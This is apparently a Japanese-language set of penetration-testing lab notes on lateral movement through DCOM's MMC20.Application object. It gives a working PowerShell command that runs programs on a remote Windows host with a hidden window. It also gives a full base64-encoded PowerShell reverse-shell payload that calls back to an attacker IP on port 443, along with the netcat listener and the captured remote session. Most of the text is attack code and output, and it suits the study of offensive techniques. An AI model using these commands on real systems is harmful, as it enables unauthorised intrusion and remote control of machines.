# 概要
DCOMとのやり取りはTCPポート135のRPC経由で行われ、DCOMサービスコントロールマネージャー（基本的にはAPI）を呼び出すにはローカル管理者のアクセスが必要

# 攻撃の概要
分散コンポーネント オブジェクト モデル(DCOM)を悪用する
## Client74からFILES04 への横展開

### 計算機をリモートで立ち上げる
#### 管理者権限でPowerShellを立ち上げる
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.184.73"))

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```
アプリケーションオブジェクトが$dcom変数に保存されると、 ExecuteShellCommandメソッドを介して必要な引数をアプリケーションに渡すことができます 。このメソッドは、 Command、 Directory、Parameters、WindowState の 4つのパラメータを受け取ります。ここで重要なのは、それぞれcmdと/c calcが設定される最初のパラメータと3番目のパラメータのみです。

```
🔹 ExecuteShellCommand の引数

$dcom.Document.ActiveView.ExecuteShellCommand(...) は、DCOM (特に MMC20.Application オブジェクト) のメソッドの1つで、以下のように定義されています：

ExecuteShellCommand(
    string Command,
    string Directory,
    string Parameters,
    string WindowStyle
)

Command → 実行するプログラム名（ここでは powershell）
Directory → 実行するディレクトリ（ここでは $null）
Parameters → コマンドライン引数（ここでは -nop -w hidden -e ...）
WindowStyle → ウィンドウの表示方法を指定する整数値

🔹 WindowStyle の値

これは Windows の ProcessWindowStyle 列挙体に相当します：
0 → Hidden（非表示）
1 → Normal（通常ウィンドウ）
2 → Minimized（最小化）
3 → Maximized（最大化）

🔹 では 7 とは？
実際には ドキュメント化されていない値 ですが、
一部の実行環境（特に MMC20.Application）では 7 が「非表示で実行する」動作になる ことが知られています。

つまり、この場合の 7 は 「PowerShell ウィンドウをユーザーに見せない」ための指定値 です。
（実際に 0 や 7 を指定すると「隠しウィンドウ」で起動します。演習や攻撃コードでよく使われるテクニックです。）

🔹 まとめ
最後の 7 は ExecuteShellCommand の第4引数（WindowStyle） を指定しており、
「リモートで実行される PowerShell をユーザーに見せずに隠す」 ために使われています。
```
## FileSv内でタスクの確認
```cmd
tasklist | findstr "calc"
```

# DCOMを使用したリバースシェル
## 変数（Target）の定義
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.184.73"))
```

## リバースシェルスクリプト
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=","7")
```

```zsh
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.45.181] from (UNKNOWN) [192.168.184.73] 64565

PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> hostname
FILES04
```
![](Assets/Images/Pasted%20image%2020260502093658.png)
